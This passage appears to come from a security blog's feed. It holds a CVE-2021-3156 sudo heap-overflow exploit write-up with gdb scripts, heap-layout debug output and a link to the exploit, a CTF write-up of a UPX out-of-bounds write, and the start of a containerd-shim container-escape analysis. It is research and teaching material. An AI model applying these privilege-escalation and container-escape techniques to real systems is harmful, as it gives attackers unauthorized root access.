nss_new_service (service_table ?: &amp;default_table,</span><br><span class="line"><span class="number">339</span>                                      ni-&gt;name);</span><br><span class="line">...</span><br><span class="line"><span class="number">342</span>     &#125;</span><br><span class="line"><span class="number">343</span> </span><br><span class="line"><span class="number">344</span>   <span class="keyword">if</span> (ni-&gt;library-&gt;lib_handle == <span class="literal">NULL</span>)</span><br><span class="line"><span class="number">345</span>     &#123;</span><br><span class="line"><span class="number">346</span>       <span class="comment">/* Load the shared library.  */</span></span><br><span class="line"><span class="number">347</span>       <span class="keyword">size_t</span> shlen = (<span class="number">7</span> + <span class="built_in">strlen</span> (ni-&gt;name) + <span class="number">3</span></span><br><span class="line"><span class="number">348</span>                       + <span class="built_in">strlen</span> (__nss_shlib_revision) + <span class="number">1</span>);</span><br><span class="line"><span class="number">349</span>       <span class="keyword">int</span> saved_errno = errno;</span><br><span class="line"><span class="number">350</span>       <span class="keyword">char</span> shlib_name[shlen];</span><br><span class="line"><span class="number">351</span> </span><br><span class="line"><span class="number">352</span>       <span class="comment">/* Construct shared object name.  */</span></span><br><span class="line"><span class="number">353</span>       __stpcpy (__stpcpy (__stpcpy (__stpcpy (shlib_name,</span><br><span class="line"><span class="number">354</span>                                               <span class="string">&quot;libnss_&quot;</span>),</span><br><span class="line"><span class="number">355</span>                                     ni-&gt;name),</span><br><span class="line"><span class="number">356</span>                           <span class="string">&quot;.so&quot;</span>),</span><br><span class="line"><span class="number">357</span>                 __nss_shlib_revision);</span><br><span class="line"><span class="number">358</span> </span><br><span class="line"><span class="number">359</span>       ni-&gt;library-&gt;lib_handle = __libc_dlopen (shlib_name);</span><br></pre></td></tr></table></figure><p>我们通过覆盖 <code>ni-&gt;name</code> ，让程序去 <code>___libc_dlopen</code> 加载我们编写的 libc 库， 在加上 <code>__attribute__ ((constructor))</code> 的魔术方法，来让加载 libc 后第一时间执行我们的代码，</p><p>（3）通过覆写 <code>def_timestampdir </code>结构体</p><pre><code>将def_timestampdir覆盖为一个不存在的目录。然后我们可以与sudo的`ts_mkdirs()`竞争，创建一个指向任意文件的符号链接。并且尝试打开这个文件，向其中写入一个struct timestamp_entry。我们可以符号链接将其指向/etc/passwd，然后以root打开他，然后实现任意用户的注入从而root这个类似的利用似乎也有 [Github](https://github.com/r4j0x00/exploits/blob/master/CVE-2021-3156/exploit.c)</code></pre><h4 id="编写利用"><a href="#编写利用" class="headerlink" title="编写利用"></a>编写利用</h4><p>这里简单描述一下，我之前调试编写利用第二种方法的过程</p><p>首先我们知道了 <code>sudo</code> 代码会根据环境变量中的 <code>LC*</code> 来分配释放堆布局</p><blockquote><p>  in setlocale(), we malloc()ate and free() several LC  environment variables (LC_CTYPE, LC_MESSAGES, LC_TIME, etc), thereby creating small holes at   the very beginning of Sudo’s heap (free fast or tcache chunks);</p></blockquote><p>其次，我们需要明确我们的目标是，我们要让分配的 <code>user_args</code>  结构体 与 <code>service_user</code> 结构体两者间的距离越近越好，因此，我们通过（fuzz 和 手动调试的方法来风水堆布局。</p><p>那么如何判断两者间的距离呢？ 首先我们对分配 <code>user_args</code> 代码处下断， 即 <code>b sudoers.c:854</code> , 然后对使用 <code>service_user</code> 处下断，，即<code>b nsswitch.c:330</code> </p><p>由于我们的利用是通过 <code>execve</code> 来执行 <code>sudoedit</code> ， 因此我们调试的是我们编写利用程序的子进程，因此还需要设置下 gdb 的调试模式</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">catch exec</span><br><span class="line">set follow-exec-mode new</span><br></pre></td></tr></table></figure><p>这样就行了， 我将以上东西集成到一个 gdb 调试脚本中，</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">catch exec</span><br><span class="line">set follow-exec-mode new</span><br><span class="line">r</span><br><span class="line">b policy_check</span><br><span class="line">c</span><br><span class="line">b sudoers.c:854</span><br><span class="line">b nsswitch.c:330  </span><br></pre></td></tr></table></figure><p>然后挂上调试器  <code>gdb exploit -x gdbscript</code> , 查看两者偏移,  </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">In file: /home/swpwn/Desktop/CVE<span class="number">-2021</span><span class="number">-3156</span>/sudo-SUDO_1_8_31/plugins/sudoers/sudoers.c</span><br><span class="line">   <span class="number">849</span>     <span class="keyword">size_t</span> size, n;</span><br><span class="line">   <span class="number">850</span></span><br><span class="line">   <span class="number">851</span>     <span class="comment">/* Alloc and build up user_args. */</span></span><br><span class="line">   <span class="number">852</span>     <span class="keyword">for</span> (size = <span class="number">0</span>, av = NewArgv + <span class="number">1</span>; *av; av++)</span><br><span class="line">   <span class="number">853</span> size += <span class="built_in">strlen</span>(*av) + <span class="number">1</span>;</span><br><span class="line"> ► <span class="number">854</span>     <span class="keyword">if</span> (size == <span class="number">0</span> || (user_args = <span class="built_in">malloc</span>(size)) == <span class="literal">NULL</span>) &#123;</span><br><span class="line">   <span class="number">855</span> sudo_warnx(U_(<span class="string">&quot;%s: %s&quot;</span>), __func__, U_(<span class="string">&quot;unable to allocate memory&quot;</span>));</span><br><span class="line">   <span class="number">856</span> debug_return_int(<span class="number">-1</span>);</span><br><span class="line">   <span class="number">857</span>     &#125;</span><br><span class="line">   <span class="number">858</span>     <span class="keyword">if</span> (ISSET(sudo_mode, MODE_SHELL|MODE_LOGIN_SHELL)) &#123;</span><br><span class="line">   <span class="number">859</span> <span class="comment">/*</span></span><br><span class="line"><span class="comment">─────────────────────────────────────────────────────────────────────────────────────────────────────────────────[ STACK </span></span><br><span class="line"><span class="comment">pwndbg&gt; bins</span></span><br><span class="line"><span class="comment">tcachebins</span></span><br><span class="line"><span class="comment">0x20 [  3]: 0x55555557ebc0 —▸ 0x5555555975c0 —▸ 0x55555558f0a0 ◂— 0x0</span></span><br><span class="line"><span class="comment">0x40 [  1]: 0x555555586700 ◂— 0x0</span></span><br><span class="line"><span class="comment">0x70 [  1]: 0x55555558f620 ◂— 0x0</span></span><br><span class="line"><span class="comment">0x80 [  1]: 0x555555586680 ◂— 0x0</span></span><br><span class="line"><span class="comment">0x90 [  1]: 0x555555586b60 ◂— 0x0</span></span><br><span class="line"><span class="comment">0x110 [  1]: 0x555555597480 ◂— 0x0</span></span><br><span class="line"><span class="comment">0x190 [  1]: 0x555555584820 ◂— 0x0</span></span><br><span class="line"><span class="comment">0x1a0 [  1]: 0x5555555896d0 ◂— 0x0</span></span><br><span class="line"><span class="comment">0x1e0 [  1]: 0x55555558f440 ◂— 0x0</span></span><br></pre></td></tr></table></figure><p>这里的 <code>tcachebins</code> 是我们即将分配的 <code>user_args</code> chunk，具体分配是哪个， 取决于 <code>user_args</code> 的大小， 然后再 c 一下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">In file: /home/swpwn/glibc<span class="number">-2.31</span>/nss/nsswitch.c</span><br><span class="line">   <span class="number">325</span> <span class="meta">#<span class="meta-keyword">if</span> !defined DO_STATIC_NSS || defined SHARED</span></span><br><span class="line">   <span class="number">326</span> <span class="comment">/* Load library.  */</span></span><br><span class="line">   <span class="number">327</span> <span class="keyword">static</span> <span class="keyword">int</span></span><br><span class="line">   <span class="number">328</span> nss_load_library (service_user *ni)</span><br><span class="line">   <span class="number">329</span> &#123;</span><br><span class="line"> ► <span class="number">330</span>   <span class="keyword">if</span> (ni-&gt;library == <span class="literal">NULL</span>)</span><br><span class="line">   <span class="number">331</span>     &#123;</span><br><span class="line">   <span class="number">332</span>       <span class="comment">/* This service has not yet been used.  Fetch the service</span></span><br><span class="line"><span class="comment">   333  library for it, creating a new one if need be.  If there</span></span><br><span class="line"><span class="comment">   334  is no service table from the file, this static variable</span></span><br><span class="line"><span class="comment">   335  holds the head of the service_library list made from the</span></span><br><span class="line"><span class="comment">─────────────────────────────────────────────────────────────────────────────────────────────────────────────────[ STACK ]──────────────────────────────────────────────────────────────────────────────────────────────────────────────────</span></span><br><span class="line"><span class="comment">pwndbg&gt; p ni</span></span><br><span class="line"><span class="comment">$1 = (service_user *) 0x555555582c20</span></span><br><span class="line"><span class="comment">pwndbg&gt;</span></span><br></pre></td></tr></table></figure><p>获取 <code>ni</code> 的地址， 与上面的 <code>tcachebins</code> 进行比较， 越近越好， 我最初的利用脚本两者偏移最小为 0x700 左右，然后中间一路覆盖过去</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/image-20210201152543462.png" title="image-20210201152543462" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/image-20210201152543462.png" alt="image-20210201152543462"></a></p><p>将 <code>ni-&gt;name</code> 覆盖为 “X/X” ,其余内容以 <code>\0</code> 覆盖，这里会涉及一个问题，那么就是如何传入<code>\00</code> 字符呢？ 我们知道 参数和环境变量都是不允许写入 <code>\x00</code>的，否则将被截断。通过阅读代码和调试我们最终发现 我们可以单独的 <code>\\</code> 字符来作为一个 <code>\x00</code> 字符。</p><p>最后提及一下，非源码调试的方法，因为当我编写利用后，在本地执行是成功了，但是换了一个机器，即非编译的 sudo 的程序执行的时候却，失败了，这个时候发现自己编译的和系统自带还是不一样的，于是我又写了一个不是自己编译的利用。</p><p>当非源码调试的时候，由于漏洞函数是位于 <code>sudoers.so</code>中，该 so 库并不是一开始就加载的，我们没法在没有符号 和 没有加载的情况下直接下断，所以我们在我们的 <code>payload</code> 设置一些特殊的字符， 比如 <code>0xdeadbeaf</code> 比如我这里设置一个单独的设置 args 参数为 ”BBBBBB”</p><p>以及我们再选择对 libc 中的 <code>__libc_dlopen_mode</code> 函数下断，因为我们最终的目的是 dlopen 我们的目标 so 程序，以及下到这个，也相当于到了 nss_load 函数附近了。</p><p>但是对这个<code> __libc_dlopen_mode</code> 可能需要 glibc 的调试符号，可以通过 <code>apt install libc6-dbg</code>  来安装，以及下断需要开启 <code>Pending Breakpoints</code> 功能</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"># cat gdbscript</span><br><span class="line">catch exec</span><br><span class="line">set breakpoint pending on</span><br><span class="line">set follow-exec-mode new</span><br><span class="line">r</span><br><span class="line">b __libc_dlopen_mode</span><br></pre></td></tr></table></figure><p>执行 <code>gdb ./exploit -x gdbscript</code></p><p>c 一次， 断到 <code>__libc_dlopen_mode</code> 这是第一次 sudo 在执行 <code>set_cmnd</code> 之前 <code>getpwuid</code> 的 nss_load 操作</p><p>再 c 一次 ， 这个就是 <code>set_cmnd</code> 之后就的 nss_load , 此时就是溢出之后的， 我们可以通过 <code>search BBBB</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; search &quot;BBBB&quot;</span><br><span class="line">[heap]          0x555555588bc0 0x4242424242424242 (&#39;BBBBBBBB&#39;)</span><br><span class="line">[heap]          0x555555588bc4 0x4242424242424242 (&#39;BBBBBBBB&#39;)</span><br><span class="line">[heap]          0x555555588bc8 0x4242424242424242 (&#39;BBBBBBBB&#39;)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>来看我们分配的堆的位置</p><p>以及查看此时的寄存器</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA</span><br><span class="line">────────────────────────────────────────────────────────────────────[ REGISTERS ]─────────────────────────────────────────────────────────────────────</span><br><span class="line">*RAX  0x7fffffffb2ea ◂— 0x336a00322e6f732e &#x2F;* &#39;.so.2&#39; *&#x2F;</span><br><span class="line">*RBX  0x555555585df0 —▸ 0x5555555891e0 ◂— 0x4300206100582f58 &#x2F;* &#39;X&#x2F;X&#39; *&#x2F;</span><br><span class="line"> RCX  0x322e</span><br><span class="line">*RDX  0x582f58</span><br><span class="line">*RDI  0x7fffffffb2e0 ◂— &#39;libnss_X&#x2F;X.so.2&#39;</span><br><span class="line"> RSI  0x80000002</span><br><span class="line">*R8   0x555555585df0 —▸ 0x5555555891e0 ◂— 0x4300206100582f58 &#x2F;* &#39;X&#x2F;X&#39; *&#x2F;</span><br><span class="line">*R9   0x7fffffffb1f0 ◂— 0x0</span><br><span class="line">*R10  0x10</span><br><span class="line"> R11  0x7ffff7f37be0 (main_arena+96) —▸ 0x5555555a06e0 ◂— 0x0</span><br><span class="line">*R12  0x5555555891b0 ◂— 0x0</span><br><span class="line">*R13  0x5555555891e0 ◂— 0x4300206100582f58 &#x2F;* &#39;X&#x2F;X&#39; *&#x2F;</span><br><span class="line">*R14  0x7fffffffb2f0 —▸ 0x7ffff7f0336a ◂— 0x6225206125000200</span><br><span class="line">*R15  0x16</span><br><span class="line">*RBP  0x7fffffffb340 —▸ 0x7fffffffb3a0 ◂— 0x0</span><br><span class="line">*RSP  0x7fffffffb2d8 —▸ 0x7ffff7e9262c (nss_load_library+364) ◂— mov    r10, qword ptr [rbp - 0x48]</span><br><span class="line"> RIP  0x7ffff7eae930 (__libc_dlopen_mode) ◂— endbr64 </span><br><span class="line"></span><br></pre></td></tr></table></figure><p>0x5555555891e0 地址为要被覆盖的目标</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; p&#x2F;x 0x5555555891e0 - 0x555555588bc0</span><br><span class="line">$1 &#x3D; 0x620</span><br></pre></td></tr></table></figure><p>通过这样的方法来查看两者的偏移</p><p>最后的利用见 <a href="https://gist.github.com/WinMin/9607a076d847f5768f372988762638f9">https://gist.github.com/WinMin/9607a076d847f5768f372988762638f9</a></p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/image-20210201155514383.png" title="image-20210201155514383" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/image-20210201155514383.png" alt="image-20210201155514383"></a></p><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p><a href="https://visualgdb.com/gdbreference/commands/set_stop-on-solib-events">https://visualgdb.com/gdbreference/commands/set_stop-on-solib-events</a></p><p><a href="https://blog.qualys.com/vulnerabilities-research/2021/01/26/cve-2021-3156-heap-based-buffer-overflow-in-sudo-baron-samedit">https://blog.qualys.com/vulnerabilities-research/2021/01/26/cve-2021-3156-heap-based-buffer-overflow-in-sudo-baron-samedit</a></p><p><a href="https://www.qualys.com/2021/01/26/cve-2021-3156/baron-samedit-heap-based-overflow-sudo.txt">https://www.qualys.com/2021/01/26/cve-2021-3156/baron-samedit-heap-based-overflow-sudo.txt</a></p></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css&quot; /&gt;&lt;div class=&quot;.article</summary>
      
    
    
    
    <category term="漏洞分析" scheme="https://bestwing.me/categories/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    
    
    <category term="CVE-2021-3156" scheme="https://bestwing.me/tags/CVE-2021-3156/"/>
    
  </entry>
  
  <entry>
    <title>RWCTF-3rd JunkAV writeup</title>
    <link href="https://bestwing.me/RWCTF-3rd-writeup.html"/>
    <id>https://bestwing.me/RWCTF-3rd-writeup.html</id>
    <published>2021-01-10T16:00:00.000Z</published>
    <updated>2021-01-11T09:21:40.000Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"<p>I made a challenge name <a href="https://github.com/chaitin/Real-World-CTF-3rd-Challenge-Attachments/tree/main/JunkAV">JunkAV</a> for RWCTF 3rd .  This is an oob write vulnerability caused by a upx processing PE program.  Congratulations to CodeR00t and 217 who solved it during the game.</p><blockquote><p>Thank <a href="https://twitter.com/leommxj">@leommxj</a> for contributing to this challenge</p></blockquote><h3 id="Details"><a href="#Details" class="headerlink" title="Details"></a>Details</h3><p>Vulnerability is in the PeFile::rebuildRelocs function of pefile.cpp in upx 3.96 .</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20210111152651.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20210111152651.png"></a></p><p>When calling the unoptimizeReloc function</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20210111152714.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20210111152714.png"></a></p><ol><li>The size of the relocn can be controlled by the user, so the allocation size can be controlled.</li><li>The 1024-1033 guild will flip the data.</li><li>When the data is flipped later, the <code>jc</code> variable on line 1021 becomes controllable, and finally the oob write is completed on line 1023</li></ol><h3 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h3><ul><li><p>generated upx compressed program :</p><p>​        <a href="http://bestwing.me/attachments/rwctf-3rd/JunkAV/gen_exploit_bin.py">http://bestwing.me/attachments/rwctf-3rd/JunkAV/gen_exploit_bin.py</a></p></li><li><p>ibuf_mod :</p><p>​        <a href="http://bestwing.me/attachments/rwctf-3rd/JunkAV/ibuf_mod">http://bestwing.me/attachments/rwctf-3rd/JunkAV/ibuf_mod</a></p></li><li><p>IO script:</p><p>​        <a href="http://bestwing.me/attachments/rwctf-3rd/JunkAV/exploit.py">http://bestwing.me/attachments/rwctf-3rd/JunkAV/exploit.py</a></p></li></ul><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20210111155913.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20210111155913.png"></a></p><h3 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h3><p><a href="https://landave.io/2020/11/bitdefender-upx-unpacking-featuring-ten-memory-corruptions/">https://landave.io/2020/11/bitdefender-upx-unpacking-featuring-ten-memory-corruptions/</a></p></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css&quot; /&gt;&lt;div class=&quot;.article</summary>
      
    
    
    
    <category term="Writeup" scheme="https://bestwing.me/categories/Writeup/"/>
    
    
    <category term="pwn" scheme="https://bestwing.me/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>CVE-2020-15257 Docker 逃逸漏洞分析</title>
    <link href="https://bestwing.me/CVE-2020-15257-anaylysis.html"/>
    <id>https://bestwing.me/CVE-2020-15257-anaylysis.html</id>
    <published>2020-12-04T16:00:00.000Z</published>
    <updated>2021-06-27T06:59:12.000Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"<h2 id="CVE-2020-15257（Docker-容器逃逸）"><a href="#CVE-2020-15257（Docker-容器逃逸）" class="headerlink" title="CVE-2020-15257（Docker 容器逃逸）"></a>CVE-2020-15257（Docker 容器逃逸）</h2><h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>2020/11/30，公开了 <a href="https://github.com/containerd/containerd/security/advisories/GHSA-36xw-fx78-c5r4"><strong>CVE-2020-15257</strong></a> 的细节。该漏洞影响 containerd 1.3.x, 1.2.x, 1.4.x 版本</p><p>由于在 host 模式下，容器与 <strong>host</strong> 共享一套 <strong>Network namespaces</strong> ，此时 <strong>containerd-shim API</strong> 暴露给了用户，而且访问控制仅仅验证了连接进程的有效UID为0，但没有限制对抽象Unix域套接字的访问。所以当一个容器为 root 权限，且容器的网络模式为 <code>--net=host</code> 的时候，通过 <strong>ontainerd-shim API</strong>  可以达成容器逃逸的目的</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/IwGn4bPEFWTY15f.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/IwGn4bPEFWTY15f.png"></a></p><h3 id="containerd-shim"><a href="#containerd-shim" class="headerlink" title="containerd-shim"></a>containerd-shim</h3><p>在进一步了解漏洞原理之前， 我们需要了解一下啊 <strong>containerd-shim</strong> 是什么？</p><p>在 1.11 版本中，Docker 进行了重大的重构，由单一的 Docker Daemon，拆分成了 4 个独立的模块：Docker Daemon、containerd、containerd-shim、runC</p><p>其中，containerd 是由 Docker Daemon 中的容器运行时及其管理功能剥离了出来。docker 对容器的管理和操作基本都是通过 containerd 完成的。</p><p>它向上为 Docker Daemon 提供了 gRPC 接口，向下通过 containerd-shim 结合 runC，实现对容器的管理控制。containerd 还提供了可用于与其交互的 API 和客户端应用程序 ctr。所以实际上，即使不运行 Docker Daemon，也能够直接通过 containerd 来运行、管理容器。</p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/q1ecxzGh9r72yM8.png" title="image-20201206002348825" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/q1ecxzGh9r72yM8.png" alt="image-20201206002348825" style="zoom:50%;" /></a><p>​    </p><p>而中间的 <strong>containerd-shim</strong> 夹杂在 containerd 和 runc 之间，每次启动一个容器，都会创建一个新的 containerd-shim 进程，它通过指定的三个参数：容器 id、bundle 目录、运行时二进制文件路径，来调用运行时的 API 创建、运行容器，持续存在到容器实例进程退出为止，将容器的退出状态反馈给 containerd</p><p>关于 <strong>containerd-shim</strong> 的作用细节可以参考作者的 <a href="https://github.com/crosbymichael/dockercon-2016/blob/master/Creating%20Containerd.pdf">slide</a></p><p>最终 ** containerd-shim ** 创建的容器的操作其实还是落实到了 <strong>runc</strong> 上， 而众所周知<strong>runC</strong> 是一个根据 OCI （Open Container Initiative）标准创建并运行容器的 CLI tool。</p><h3 id="漏洞原因"><a href="#漏洞原因" class="headerlink" title="漏洞原因"></a>漏洞原因</h3><p>漏洞原因在前言部分已经写得很清楚了，说白了就说 暴露了不该有的 API 接口，而   <strong>containerd-shim</strong>  的 API 接口由 Unix 域套接字 实现。代码实现位于</p><p><a href="https://github.com/containerd/containerd/blob/b321d358e6eef9c82fa3f3bb8826dca3724c58c6/runtime/v1/linux/bundle.go#L136">https://github.com/containerd/containerd/blob/b321d358e6eef9c82fa3f3bb8826dca3724c58c6/runtime/v1/linux/bundle.go#L136</a></p><p>实际上在， docker 容器中（以 –net=host 运行),   <strong>containerd-shim</strong>   API 大概长这样</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/image-20201206003829351.png" title="image-20201206003829351" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/image-20201206003829351.png" alt="image-20201206003829351"></a></p><blockquote><p><strong>1)/var/run/docker.sock</strong>：Docker Daemon 监听的 Unix 域套接字，用于 Docker client 之间通信；</p><p><strong>2)/run/containerd/containerd.sock</strong>：containerd 监听的 Unix 域套接字，Docker Daemon、ctr 可以通过它和 containerd 通信；</p><p><strong>3)@/containerd-shim/3d6a9ed878c586fd715d9b83158ce32b6109af11991bfad4cf55fcbdaf6fee76.sock</strong>：</p><p>这个就是上文所述的，containerd-shim 监听的 Unix 域套接字，containerd 通过它和 containerd-shim 通信，控制管理容器。</p><p>/var/run/docker.sock、/run/containerd/containerd.sock 这两者是普通的文件路径，虽然容器共享了主机的网络命名空间，但没有共享 mnt 命名空间，容器和主机之间的磁盘挂载点和文件系统仍然存在隔离，所以在容器内部之间仍然不能通过 /var/run/docker.sock、/run/containerd/containerd.sock 这样的路径连接对应的 Unix 域套接字。</p><p>但是 @/containerd-shim/{sha256}.sock 这一类的抽象 Unix 域套接字不一样，它没有依靠 mnt 命名空间做隔离，而是依靠网络命名空间做隔离。</p></blockquote><p>containerd 传递 Unix 域套接字文件描述符给 <strong>containerd-shim</strong>。<strong>containerd-shim</strong> 在正式启动之后，会基于父进程（也就是 containerd）传递的 Unix 域套接字文件描述符，建立 gRPC 服务，对外暴露一些 API 用于 container、task 的控制：</p><p>通过查阅代码，我们大概知道我们如果能正常访问 <strong>containerd-shim</strong> 接口，我们大概能有这些操作</p><p><a href="https://github.com/containerd/containerd/blob/v1.4.2/runtime/v1/shim/v1/shim.proto">https://github.com/containerd/containerd/blob/v1.4.2/runtime/v1/shim/v1/shim.proto</a></p><figure class="highlight protobuf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">service</span> <span class="title">Shim</span> </span>&#123;</span><br><span class="line"><span class="comment">// State returns shim and task state information.</span></span><br><span class="line"><span class="function"><span class="keyword">rpc</span> State(StateRequest) <span class="keyword">returns</span> (StateResponse)</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">rpc</span> Create(CreateTaskRequest) <span class="keyword">returns</span> (CreateTaskResponse)</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">rpc</span> Start(StartRequest) <span class="keyword">returns</span> (StartResponse)</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">rpc</span> Delete(google.protobuf.Empty) <span class="keyword">returns</span> (DeleteResponse)</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">rpc</span> DeleteProcess(DeleteProcessRequest) <span class="keyword">returns</span> (DeleteResponse)</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">rpc</span> ListPids(ListPidsRequest) <span class="keyword">returns</span> (ListPidsResponse)</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">rpc</span> Pause(google.protobuf.Empty) <span class="keyword">returns</span> (google.protobuf.Empty)</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">rpc</span> Resume(google.protobuf.Empty) <span class="keyword">returns</span> (google.protobuf.Empty)</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">rpc</span> Checkpoint(CheckpointTaskRequest) <span class="keyword">returns</span> (google.protobuf.Empty)</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">rpc</span> Kill(KillRequest) <span class="keyword">returns</span> (google.protobuf.Empty)</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">rpc</span> Exec(ExecProcessRequest) <span class="keyword">returns</span> (google.protobuf.Empty)</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">rpc</span> ResizePty(ResizePtyRequest) <span class="keyword">returns</span> (google.protobuf.Empty)</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">rpc</span> CloseIO(CloseIORequest) <span class="keyword">returns</span> (google.protobuf.Empty)</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ShimInfo returns information about the shim.</span></span><br><span class="line"><span class="function"><span class="keyword">rpc</span> ShimInfo(google.protobuf.Empty) <span class="keyword">returns</span> (ShimInfoResponse)</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span 